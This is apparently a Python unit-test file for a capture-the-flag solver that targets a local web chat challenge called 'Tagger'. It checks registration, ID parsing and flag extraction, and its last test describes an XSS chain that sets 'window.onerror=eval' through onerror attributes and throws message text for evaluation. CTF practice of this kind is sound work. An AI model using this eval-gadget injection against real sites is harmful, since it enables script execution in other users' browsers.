#!/usr/bin/env python3
import sys
import unittest
import json
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "solver"))

from solve import (  # noqa: E402
    DEFAULT_TARGET,
    DEFAULT_TIMEOUT_SECONDS,
    extract_chat_id,
    extract_flag,
    extract_request_id,
    extract_user_id,
    exploit_messages,
    is_loading_instance,
    registration_payload,
)


class SolverParsingTests(unittest.TestCase):
    def test_default_target_matches_local_challenge_port(self):
        self.assertEqual(DEFAULT_TARGET, "http://localhost:5000")
        self.assertEqual(DEFAULT_TIMEOUT_SECONDS, 300)

    def test_loading_page_is_detected_from_root_html(self):
        self.assertTrue(
            is_loading_instance(
                '<meta name="tfcctf-challenge-loading" content="true">'
            )
        )
        self.assertFalse(is_loading_instance("<title>Tagger</title>"))

    def test_registration_payload_repeats_password_for_confirmation(self):
        payload = registration_payload("Hacker ", "Password123!")
        self.assertEqual(
            payload,
            {
                "username": "Hacker ",
                "password": "Password123!",
                "confirmPassword": "Password123!",
            },
        )

    def test_extract_user_id_requires_exact_visible_username(self):
        html = """
        <a href="/discover?q=Hacker">Hacker</a>
        <article class="user-card"><h2>Hacker </h2>
          <form action="/friends/request/17" method="post"></form>
        </article>
        """
        self.assertEqual(extract_user_id(html, "Hacker "), "17")
        self.assertIsNone(extract_user_id(html, "Hacker"))

    def test_extract_request_and_chat_ids_from_forms_and_links(self):
        request_html = '<form action="/friends/accept/23" method="post"></form>'
        chat_html = (
            '<a class="conversation" href="/chat/41">'
            '<strong>FlagHolder </strong></a>'
        )
        self.assertEqual(extract_request_id(request_html), "23")
        self.assertEqual(extract_chat_id(chat_html, "FlagHolder "), "41")

    def test_extract_flag_from_chat_html(self):
        html = "<p>TFCCTF{local-test-flag}</p>"
        self.assertEqual(extract_flag(html), "TFCCTF{local-test-flag}")

    def test_exploit_messages_use_eval_gadget(self):
        messages = exploit_messages(2)
        self.assertEqual(len(messages), 3)
        self.assertEqual(messages[0]["type"], "text")
        self.assertTrue(messages[0]["content"].startswith("=fetch("))
        self.assertEqual(messages[0]["content"].count("{"), messages[0]["content"].count("}"))
        self.assertEqual(
            json.loads(messages[1]["attributes"])["onerror"],
            "window.onerror=eval",
        )
        self.assertTrue(
            json.loads(messages[2]["attributes"])["onerror"].startswith(
                "throw event.target"
            )
        )
        self.assertIn(
            "firstElementChild.firstElementChild.textContent",
            json.loads(messages[2]["attributes"])["onerror"],
        )


if __name__ == "__main__":
    unittest.main()
